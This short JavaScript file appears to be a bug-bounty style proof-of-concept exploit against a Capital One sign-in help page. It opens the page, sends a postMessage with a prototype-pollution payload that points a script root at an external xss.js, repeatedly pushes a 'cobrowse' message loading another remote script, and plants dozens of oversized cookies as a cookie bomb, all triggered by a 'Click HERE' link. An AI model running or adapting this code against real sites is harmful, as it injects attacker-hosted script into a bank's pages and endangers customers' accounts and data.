
function exploit()
{
     let target =  window.open('https://verified.capitalone.com/sign-in-help/pii');

    // https://myaccounts.capitalone.com/accountSummary 
     


    setTimeout(function(){
        debugger;


        target.postMessage('{"data":{"ts":1652796417473,"tfs-session":{"__proto__":{"ReactNativeWebView":1,"clientKey":"1","reload":1,"CustomInviteManager":{"checkAvailability":{}},"Conf":{"CONST_ASSIST_VS_ROOT":"1","CONST_ASSIST_CA_ROOT":"2"},"WOWPx":{}, "VisitorFiltering":{},"cdnRoot":"shrtsn.github.io/avishyard/xss.js#"}, "reload":1, "asid":1,"widgetLoaded":false,"urls":"[{\\"title\\":\\"Capital One - Sign In Help\\",\\"url\\":\\"https://verified.capitalone.com/sign-in-help/pii\\",\\"time\\":1,\\"loadts\\":1652796416798,\\"tabId\\":\\"tfs-tab-6kozs\\"}]","vi":"e4fa9550-2ca0-41f6-9fa4-72553e5b14de"},"source":"tfs-tab-6kozs","tfs-tab-6kozs":{"app":{"tabId":"tfs-tab-6kozs"}}},"queryCommand":"init"}',"*");
        
        
    },7000);
    
    
    setInterval(function(){
        target.postMessage('{"_name":"cobrowse", "_data":{"url":"https://smgsys.github.io/jsVul/psp/dbnk-v1-001/vulpx.js"}}',"*");
        
    },5000);
    
   

}


function cookieBomb()
{
    let p = Array(4000).join('a');
    for(let i=1;i<99;i++)
    {
        document.cookie=`bomb${i}=${p};path=/frontends/files/xd.html;max-age=600;SameSite=None;Secure`;
    }
}



cookieBomb();

document.body.innerHTML = `Click <a href="javascript:exploit()">HERE</a>`;


    

